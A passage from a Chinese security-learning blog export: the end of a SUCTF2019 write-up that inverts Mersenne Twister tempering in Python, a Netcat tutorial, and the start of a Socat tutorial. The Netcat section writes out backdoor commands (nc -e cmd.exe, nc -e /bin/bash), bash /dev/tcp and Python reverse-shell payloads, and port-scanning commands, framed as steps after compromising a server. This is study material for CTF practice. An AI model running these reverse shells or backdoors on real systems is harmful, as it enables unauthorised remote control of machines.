^ m &gt;&gt; 13</span></span><br><span class="line">    output = second_cal_re(m)</span><br><span class="line">    <span class="keyword">assert</span> long_to_bytes(output) == flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>

<p>测试结果没有报错，成功（虽然在后面我发现了致命的问题，根据选取字符的不同，这个逆函数的结果不一定是对的，比如<code>b&#39;1234&#39;转数字是9位，而b&#39;abcd&#39;是8位</code>，这就具有不确定性了）</p>
<p>显然第四个位运算和第一个位运算是同一类型的，用同样的方法，也可以逆回来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forth_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:])-x</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:]</span><br><span class="line">    part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    output = <span class="built_in">int</span>(part1+part2, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>然后我稍加合并，这两个位运算的逆过程就是这样，经过我多轮的测试，在本题应该不会出错，为了方便食用，后面我贴的都节选自最后跑出来的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>))-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">0</span>:</span><br><span class="line">        y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)) - x</span><br><span class="line">        c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">        <span class="comment"># 高x位完全相同</span></span><br><span class="line">        part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">        part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">        output = <span class="built_in">int</span>(part1 + part2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">    <span class="comment"># 高x位完全相同</span></span><br><span class="line">    high13 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    <span class="comment"># 中间的几位</span></span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<h3 id="第二三组位运算"><a href="#第二三组位运算" class="headerlink" title="第二三组位运算"></a>第二三组位运算</h3><p>然后我们再看第二和第三个位运算变化，如法炮制，大致算法参照如下</p>
<img alt="[SUCTF2019]MT 我也很异或呢-86361ff5.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-86361ff5.png" width="" height="" >

<p>大致的思路就是，最开始低9位是保持不变的，我们可以用第九位反推出13到21位，知道了13到21位，又可以推出9到12位，依次类推，整个过程是可逆的</p>
<p>实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_cal_re</span>(<span class="params">c, x, y</span>):</span></span><br><span class="line">    y = <span class="built_in">bin</span>(y)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">    <span class="comment"># 低x位保持不变</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-x, <span class="built_in">len</span>(y)):</span><br><span class="line">        output[i] = <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 13-21位 = (低x位)&amp;(y[13:21])^c[13:21]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">2</span>*x, <span class="built_in">len</span>(y)-x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 4-12位 = (13-21位)&amp;(y[4:12])^c[4:12]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">3</span>*x, <span class="built_in">len</span>(y)-<span class="number">2</span>*x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 高4位 = (8-12位)&amp;(y[0:3])^c[0:3]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> _: <span class="built_in">str</span>(_), output))</span><br><span class="line">    output = <span class="built_in">int</span>(output, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>第三个位运算的逆过程和这个脚本一样</p>
<p>然后在实际跑的时候，我发现了一些bug，正如上面提到的，这些位数的不同导致了我这个方法的局限性，像什么，那个位移9位的那个，因为它有32位，结果会出错，还有位移13位的，主要都是位数不对带来的吧。所以这种方法明显低效，且不普适，后面也不会再花时间研究</p>
<p>但写都写了是吧，自己的思路，爬也要爬完，况且情况已经很局限了</p>
<h2 id="三、完整脚本"><a href="#三、完整脚本" class="headerlink" title="三、完整脚本"></a>三、完整脚本</h2><p>花了操作系统实验课一半的时间，我终于改对了（不过是事先知道flag长啥样了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>))-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">0</span>:</span><br><span class="line">        y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)) - x</span><br><span class="line">        c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">        <span class="comment"># 高x位完全相同</span></span><br><span class="line">        part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">        part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">        output = <span class="built_in">int</span>(part1 + part2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">    <span class="comment"># 高x位完全相同</span></span><br><span class="line">    high13 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    <span class="comment"># 中间的几位</span></span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_cal_re</span>(<span class="params">c, x, y</span>):</span></span><br><span class="line">    y = <span class="built_in">bin</span>(y)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">    <span class="comment"># 低x位保持不变</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-x, <span class="built_in">len</span>(y)):</span><br><span class="line">        output[i] = <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 13-21位 = (低x位)&amp;(y[13:21])^c[13:21]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">2</span>*x, <span class="built_in">len</span>(y)-x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 4-12位 = (13-21位)&amp;(y[4:12])^c[4:12]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">3</span>*x, <span class="built_in">len</span>(y)-<span class="number">2</span>*x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 高4位 = (8-12位)&amp;(y[0:3])^c[0:3]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> _: <span class="built_in">str</span>(_), output))</span><br><span class="line">    output = <span class="built_in">int</span>(output, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = first_cal_re(m, <span class="number">19</span>)</span><br><span class="line">    m = second_cal_re(m, <span class="number">17</span>, <span class="number">2245263360</span>)</span><br><span class="line">    m = second_cal_re(m, <span class="number">9</span>, <span class="number">2029229568</span>)</span><br><span class="line">    m = first_cal_re(m, <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="comment"># 对应括号外的encode(&#x27;hex&#x27;)</span></span><br><span class="line">    message = <span class="string">b&#x27;641460a9e3953b1aaa21f3a2&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) // <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span>: i * <span class="number">4</span> + <span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        block = bytes_to_long(block)</span><br><span class="line">        block = re_convert(block)</span><br><span class="line">        block = long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="built_in">print</span> new_message.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="四、另一位师傅的思路"><a href="#四、另一位师傅的思路" class="headerlink" title="四、另一位师傅的思路"></a>四、另一位师傅的思路</h2><p>对，又是尚师傅，在我迷茫的时候又给我指点迷津，他一下就看出，这是一个可以循环回来的位运算，所以直接写了循环就跑出来了</p>
<p>一哩窝里GIAO</p>
<img alt="[SUCTF2019]MT 我也很异或呢-ce3e9430.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-ce3e9430.png" width="" height="">

<img alt="[SUCTF2019]MT 我也很异或呢-30b8ac87.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-30b8ac87.png" width="" height="" >

<p>牛啊，人上人</p>
<h2 id="五、题目总结"><a href="#五、题目总结" class="headerlink" title="五、题目总结"></a>五、题目总结</h2><p>虽然也不是什么动脑子的题目，重复一遍过程，然后扣细节。但还是很兴奋，第一次自己做出这种题目（主要是师傅们的wp看不懂哇），对于之前一直没有攻克的线性移位寄存器也有一定思路了</p>
<p>还有一句废话，就是，这题难度不大，因为存在上面这种做法，所以如果是比赛，给我五分钟做出来</p>
<h2 id="六、关于MT"><a href="#六、关于MT" class="headerlink" title="六、关于MT"></a>六、关于MT</h2><p>哈哈哈哈哈，重要的话放在最后说</p>
<p>所以像我这样这么愚蠢地去分析这个具体的流程是很低效的，浪费时间，做这种题目的思路应该是找出其中的<strong>规律</strong>，现成的也好，但毕竟头几次接触，这样也无可厚非，人都是会慢慢成长起来的</p>
<p>去看了之前没有看懂的wp，有些人qs采用的就是尚师傅这个思路</p>
<img alt="[SUCTF2019]MT 我也很异或呢-40747019.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-40747019.png" width="" height="" >

<p>但很多是py</p>
<p>看到安全客的人上人wp</p>
<img alt="[SUCTF2019]MT 我也很异或呢-d514d3be.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-d514d3be.png" width="" height="">

<p>知音啊，就是比我精简了好多</p>
<p>至于为什么可以逆回来呢？官方wp才是yyds</p>
<p>先看看出题人的出题思路<br><img alt="[SUCTF2019]MT 我也很异或呢-01fc37a9.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-01fc37a9.png" width="" height=""></p>
<p>所以我的思路没错，就是逆，我逆的是具体每一步，而没有发现更大的规律</p>
<p><strong>只存在左移和右移的区别</strong></p>
<p>看官方的代码觉得好简单，但还是不知道</p>
<img alt="[SUCTF2019]MT 我也很异或呢-58e3c5e7.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-58e3c5e7.png" width="" height="">

<p>在此也暂时不往下研究了，总之是有规律的，在这道题花了太多时间，虽然我觉得值，但价值快被榨干了，应该赋予弄懂的希望在之后同类型的题目</p>
<hr>
<p>也许，</p>
<p>绕远路才是我的最短捷径——Julius·Caesar·Zeppeli</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
        <tag>伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>Netcat</title>
    <url>/posts/50009ff3/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p><a href="https://eternallybored.org/misc/netcat/">win安装nc的地址</a></p>
<p>基于TCP/IP协议，采用C/S模式，是一种由服务器发起的被动连接</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910134418073.png" alt="image-20210910134418073"></p>
<p><code>netstat -an</code></p>
<h2 id="基本的命令"><a href="#基本的命令" class="headerlink" title="基本的命令"></a>基本的命令</h2><ol>
<li><p><strong>建立一个简单的通信</strong>（爱情只有双向奔赴才有意义）</p>
<ul>
<li>创建一个服务端：<code>nc -l -p [localport]</code><ul>
<li><code>l</code>表示启动监听模式</li>
<li><code>p</code>表示监听的端口</li>
</ul>
</li>
<li>创建一个客户端：<code>nc [remote_addr] [remoteport]</code></li>
</ul>
</li>
<li><p><strong>返回shell的使用</strong></p>
<ul>
<li>创建一个服务器端：<code>nc -l -p [localport] -e cmd.exe</code></li>
<li>创建一个客户端：<code>nc -[remote_addr] [remoteport]</code></li>
</ul>
</li>
<li><p><strong>文件传输</strong>（当然也可以客户端向服务端发送）</p>
<ul>
<li>创建一个服务端：<code>nc -l -p [localport] &gt; outfile</code></li>
<li>创建一个客户端：<code>nc [remote_addr][remoteport] &lt; infile</code></li>
</ul>
</li>
<li><p><strong>避免“假死”</strong></p>
<ul>
<li><code>nc -w3 [ip] [port]</code>，等待3秒不能连接上直接断掉</li>
</ul>
</li>
<li><p><strong>端口扫描</strong></p>
<ul>
<li><code>nc -v -n -z -w1 [target_ip][start_target_port-stop_target_port]</code><ul>
<li><code>v</code>表示对错误进行详细输出</li>
<li><code>n</code>不对目标机器进行DNS解析</li>
<li><code>z</code>zero I/O模式，专用于端口扫描。表示对目标IP发送的数据表中不包含任何payload，加快扫描速度</li>
<li><code>w</code>超时设置为1秒</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>banner信息的抓取</strong></p>
<ul>
<li><code>echo &quot; &quot; | nc -v -n -z -w1 [target_ip][start_target_port-stop_target_port]</code> </li>
</ul>
</li>
<li><p><strong>win建立后门</strong></p>
<ul>
<li><p>监听型后门：<code>nc -l -p [localport] -e cmd.exe</code></p>
</li>
<li><p>连接型后门：<code>nc [remote_ip] [remote_port] -e cmd.exe</code></p>
<p>以上两个操作是在被攻陷拿到低权限的客户端，也就是我们攻击者作为服务端，只要在这之前打开这个连接，就可以获取win客户端的shell</p>
</li>
</ul>
</li>
<li><p><strong>linux建立后门</strong></p>
<ul>
<li>监听型后门：<code>nc -l -p [localport] -e /bin/bash</code></li>
<li>连接型后门：<code>nc [remote_ip] [remote_port] -e /bin/bash</code></li>
</ul>
<p><code>nc</code>没有-e可以用<code>ncat</code>代替</p>
</li>
</ol>
<h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><ul>
<li><p><code>d</code> 脱离命令窗口，在后台运行，与建立后门更配</p>
</li>
<li><p><code>e</code>执行某个程序</p>
</li>
<li><p><code>G</code>设置网关，突破内网限制</p>
</li>
<li><p><code>g num</code>路由跳数</p>
</li>
<li><p><code>i sec</code>设置发送每一行数据的时间间隔</p>
</li>
<li><p><code>l</code>设置netcat处于监听状态等待连接</p>
</li>
<li><p><code>L</code>设置netcat处于监听状态等待连接，当客户端断开，服务端依旧回到等待状态</p>
</li>
<li><p><code>n</code>设置netcat只识别ip地址，不进行DNS解析</p>
</li>
<li><p><code>o file</code>设置传输十六进制的数据</p>
</li>
<li><p><code>-p port</code>设置本地监听的端口号</p>
</li>
<li><p><code>r</code>设置netcat随机化的端口号</p>
</li>
<li><p><code>s addr</code>设置netcat的源地址</p>
</li>
<li><p><code>t</code>回复telnet请求数据包</p>
</li>
<li><p><code>u</code>设置netcat使用UDP模式</p>
</li>
<li><p><code>v</code>显示错误提示信息</p>
</li>
<li><p><code>w secs</code>设置连接超时秒数</p>
</li>
<li><p><code>-z</code>设置扫描模式，表示发送的数据包中不包含任何payload</p>
</li>
</ul>
<h2 id="连接转发"><a href="#连接转发" class="headerlink" title="连接转发"></a>连接转发</h2><p>突破内外网的限制</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910174315946.png" alt="image-20210910174315946"></p>
<ul>
<li><code>echo nc [target] [port] &gt; delay.bat</code></li>
<li><code>nc -l -p [localport] -e delay.bat</code></li>
</ul>
<p>当客户端连接到该服务器端时，连接的客户端通过服务端连接到target port上，实现了连接转发</p>
<p>其中<code>delay.bat</code>文件中的内容是<code>nc64.exe [target] [port]</code>，连接目标服务器</p>
<p>小绕，简洁一点</p>
<ul>
<li>目标服务器：与转发服务器在同一网段下，打开本地一个端口用于监听</li>
<li>转发服务器：打开本地的一个端口并运行<code>delay.bat</code>批处理文件</li>
<li>客户端：直接连接转发服务器</li>
</ul>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>当拿道服务器权限，而服务器没有也没有办法安装Netcat时，可以反弹一个shell到客户端，然后客户端执行有关命令，让服务器返回对应的内容</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910180330461.png" alt="image-20210910180330461"></p>
<ul>
<li><p>服务器端反弹shell命令：<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p>
</li>
<li><p>客户端接收Netcat命令：<code>nc -lvp port</code></p>
</li>
</ul>
<p>服务器端输入的反弹shell命令中的ip和port是客户端的ip和port</p>
<p>主要的原理如下</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210910222826253.png" alt="image-20210910222826253"></p>
<h2 id="反弹shell（python）"><a href="#反弹shell（python）" class="headerlink" title="反弹shell（python）"></a>反弹shell（python）</h2><p>当拿道服务器权限，而服务器没有也没有办法安装Netcat，但是安装了Python（Linux默认安装），可以用Python反弹shell</p>
<ul>
<li><p>服务器端反弹shell命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os, socket, subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connnect((&#x27;ip&#x27;, port));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);p=subprocess.call([&#x27;/bin/bash&#x27;, &#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, socket, subprocess</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connnect((<span class="string">&#x27;ip&#x27;</span>, port))</span><br><span class="line">os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
<li><p>客户端接收：<code>nc -lvp [port]</code></p>
</li>
</ul>
<p>os的dup2方法将标准输入，输出，错误输出重定向到远程</p>
<h2 id="Netcat（Nc不支持-e时）"><a href="#Netcat（Nc不支持-e时）" class="headerlink" title="Netcat（Nc不支持-e时）"></a>Netcat（Nc不支持-e时）</h2><ul>
<li>服务器端反弹shell命令：<code>nc [ip] [port] | /bin/bash | nc [ip] [port]</code></li>
<li>客户端接收命令：<code>nc -lvp [port]</code></li>
</ul>
<p>客户端要启动两个窗口，开启监听，并且两个端口要不同，这样是为了通过管道符将客户端一个监听窗口的命令的执行结果返回到另外一个监听窗口</p>
<h2 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h2><p>似乎在同一网络下，不同电脑似乎连不上</p>
<p>在服务器上开，竟然不行，很奇怪，不知道哪里搞错了</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Socat</title>
    <url>/posts/bbcb3fe9/</url>
    <content><![CDATA[<p>Socat是Netcat的升级版，所做的工作就是在2个address指定的描述符间建立一个pipe用于发送和接收数据</p>
<span id="more"></span>

<h1 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h1><p>抄的是<a href="https://www.hi-linux.com/posts/61543.html">这篇文章</a>，除了个别用到的，其他没怎么实现过，没有验证过是否正确</p>
<p>先将最实用的，CTF-Crypto出题一般就是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [port]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = <span class="string">&#x27;socat -d -d tcp-l:&#x27;</span> + port + <span class="string">&#x27;,reuseaddr,fork EXEC:&quot;python -u server.py&quot; &#x27;</span></span><br><span class="line">os.system(command)</span><br></pre></td></tr></table></figure>

<h2 id="基本的操作"><a href="#基本的操作" class="headerlink" title="基本的操作"></a>基本的操作</h2><h3 id="Socat命令语法"><a href="#Socat命令语法" class="headerlink" title="Socat命令语法"></a>Socat命令语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat [options] &lt;address&gt; &lt;address&gt;</span><br></pre></td></tr></table></figure>

<p>附加选项用逗号隔开</p>
<p>address常见的取值</p>
<ul>
<li><code>-,STDIN,STDOUT</code>：表示标准输入输出，可以就用一个横杠代替。</li>
<li><code>/var/log/syslog</code>：打开一个文件作为数据流，可以是任意路径。</li>
<li><code>TCP:</code>：建立一个 TCP 连接作为数据流，TCP 也可以替换为 UDP 。</li>
<li><code>TCP-LISTEN</code>：建立 一个 TCP 监听端口，TCP 也可以替换为 UDP。</li>
<li><code>EXEC</code>：执行一个程序作为数据流。</li>
</ul>
<h3 id="常见功能实现"><a href="#常见功能实现" class="headerlink" title="常见功能实现"></a>常见功能实现</h3><h4 id="建立相互一个简单的通信"><a href="#建立相互一个简单的通信" class="headerlink" title="建立相互一个简单的通信"></a>建立相互一个简单的通信</h4><ul>
<li>服务器端：<code>socat -TCP4-LISTEN:4440</code></li>
<li>客户端：<code>socat -TCP4:[ip]:[port]</code></li>
</ul>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><ol>
<li><p><strong>读取文件</strong></p>
<ul>
<li><p>绝对路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - [absolute address]</span><br></pre></td></tr></table></figure></li>
<li><p>相对路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - ./[relative address]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>写入文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;INPUT_CONTENT&quot; | socat - [address]</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h4><ol>
<li><p><strong>连接远程端口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - TCP:[ip]:[port]</span><br></pre></td></tr></table></figure></li>
<li><p><strong>监听一个新端口</strong></p>
<p>应该是在链接远程端口的基础上，我猜，或者本地？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:[port] -</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>这个我们用到了，我的理解就是Crypto做nc题目的过程</p>
<ol>
